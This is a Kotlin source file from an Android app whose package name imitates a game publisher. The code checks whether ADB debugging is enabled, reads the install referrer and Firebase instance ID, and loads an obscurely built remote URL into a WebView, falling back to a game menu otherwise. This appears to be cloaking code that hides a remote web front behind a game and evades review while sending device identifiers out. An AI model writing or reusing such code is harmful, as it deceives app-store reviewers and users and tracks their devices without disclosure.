package com.com2us.wannabe.android.google.global.nor.data.rain

import android.content.Context
import android.provider.Settings
import android.webkit.WebSettings
import androidx.activity.ComponentActivity
import androidx.lifecycle.lifecycleScope
import com.android.installreferrer.api.InstallReferrerClient
import com.android.installreferrer.api.InstallReferrerStateListener
import com.google.firebase.Firebase
import com.google.firebase.analytics.analytics
import com.com2us.wannabe.android.google.global.nor.data.rain.mydata.StateOfStorage.getUrl
import com.com2us.wannabe.android.google.global.nor.data.rain.mynav.NavPoint
import com.com2us.wannabe.android.google.global.nor.data.rain.mynav.OneNav.point
import com.com2us.wannabe.android.google.global.nor.ui.games.LengthManager
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.suspendCancellableCoroutine
import kotlinx.coroutines.tasks.await
import kotlinx.coroutines.withContext
import java.util.concurrent.atomic.AtomicBoolean
import kotlin.coroutines.resume

val cua = "evwipu70x"

fun collectA(context: Context): String {
    return Settings.Global.getString(context.contentResolver, Settings.Global.ADB_ENABLED) ?: "0"
//     return "0"
}

suspend fun anim(context: Context): String =
    suspendCancellableCoroutine { continuation ->
        val client = InstallReferrerClient.newBuilder(context).build()
        val isResumed = AtomicBoolean(false)

        continuation.invokeOnCancellation {
            client.endConnection()
        }

        client.startConnection(object : InstallReferrerStateListener {
            override fun onInstallReferrerSetupFinished(responseCode: Int) {
                try {
                    if (!isResumed.compareAndSet(false, true)) return

                    val result =
                        if (responseCode == InstallReferrerClient.InstallReferrerResponse.OK) {
                            client.installReferrer.installReferrer
                        } else {
                            "null"
                        }

                continuation.resume(result)
//                    continuation.resume("utm_source=apps.facebook.com&utm_campaign=fb4a_content=%7B%22app%22%3A%2223623634262346%22%2C%22t%22%3A1777361775%2C%22source%22%3A%7B%22data%22%3A%2274d2251fd2b8ed970d9b00416056702b1686ec0a1c74d886d8140fc77bd45eb226e3b6c2b2ae370e87b39309307442346058a25d9567f197222c20dd494712b7a87bb719eee245117e23a237ea3f59e2d0920fe458256ab2c760396f5a6f04ebf0c170c74829187091106476ae638097f07bec5bace2d64b0d7306a4cac4c8fe6d5151b33f6c85640563d0d0857426feaf077a53472b4d90e3de787cec63e24a4887b548a0c172fc7321f6d2dcb55d2a41ca13613510926d18696195a39a3ae0b49d379ad4e0c5d57916159e1009d21ee515231f29dca9453e64385098792fa67730af6d5403fddedca9ff6d512fa6e9c09d6661cd9ad9202ee6faa3324f9284d263f2cc660b3ea5eec3b6af1103369e9396f2f0ccfbe9f790b6ffbb2a60b0707a50919b91e8a4d74b6106fbfcba370b91453eb70ab36dbd35c6cbb8870554c0b5fec79202d2c1a7c2d50f754bef84223704815e527c5c8f91375b67c0ef84a14b94c5e2bad0eb8e77ecd22bfae65661836e8ca460738ae0de9fe35dd62ac822a68f73aaf18189aa06f651b0f343eefb1d2ce75f8d26a288eb8826008b634391202d228fabc322d77ebb49ce1b314e49ff5c108e099134cf55f7a10d92d0adfdb3fd60816e8a179ed20f6aba0c66e26c3b310d159f3b4283ea367f034e223de08448cd3df05a5beed20d5acd7c547291ec6dfdb70a8870496ebdea468e8f40de77e95b3ac71a1fd352a3eb23003e6ac607c9df4364434fa67cf1139f1d30ca55f00524151b83afd8df28b9c3a5f7a169%22%2C%22nonce%22%3A%22177feee1ffd27c18fec5a790%22%7D%7D")
//                    continuation.resume("cmpgn=aaaa_TEST-Deeplink_bbbb_cccc_dddd")
//                continuation.resume("cmpgn=aaaa_MA-TEST_bbbb_cccc_dddd")

                } catch (_: Exception) {
                    if (isResumed.compareAndSet(false, true)) {
                        continuation.resume("null")
                    }
                } finally {
                    client.endConnection()
                }
            }

            override fun onInstallReferrerServiceDisconnected() {
                if (isResumed.compareAndSet(false, true)) {
                    continuation.resume("null")
                }
            }
        })
    }

lateinit var beforeCoin: String

fun ifConnected(activity: ComponentActivity, initWorker: InitWorker) {
    activity.lifecycleScope.launch(Dispatchers.IO) {
        runCatching {
            val url = getUrl(activity)

            if (url.isBlank()) {
                beforeCoin = anim(activity)
                createFlow(activity, initWorker)
            } else {
                withContext(Dispatchers.Main) {
                    initWorker.newV().getW().apply {
                        requestFocus()
                        loadUrl(url)
                    }
                }
            }
        }
    }
}

suspend fun createFlow(
    context: Context,
    initWorker: InitWorker,
) {
    val url = buildUrl(context, initWorker)

    if (url.isEmpty()) {
        point(NavPoint.MenuPoint)
        return
    }

    val headers = buildHeaders(context)

    withContext(Dispatchers.Main) {
        runCatching {
            initWorker.newView.loadUrl(url, headers)
        }.onFailure {
            point(NavPoint.MenuPoint)
        }
    }
}

private suspend fun buildUrl(
    context: Context,
    initWorker: InitWorker,
): String {
    val firebaseId = getFirebaseId()

    return buildString {
        append(LengthManager().long)
        append("?")
        append(support(beforeCoin, firebaseId, context, initWorker))
    }
}

private suspend fun getFirebaseId(): String =
    runCatching {
        Firebase.analytics.appInstanceId.await()
    }.getOrNull().orEmpty()

private fun buildHeaders(context: Context): Map<String, String> =
    runCatching {
        val userAgent = WebSettings.getDefaultUserAgent(context)
        mapOf(cua to userAgent)
    }.getOrDefault(emptyMap())
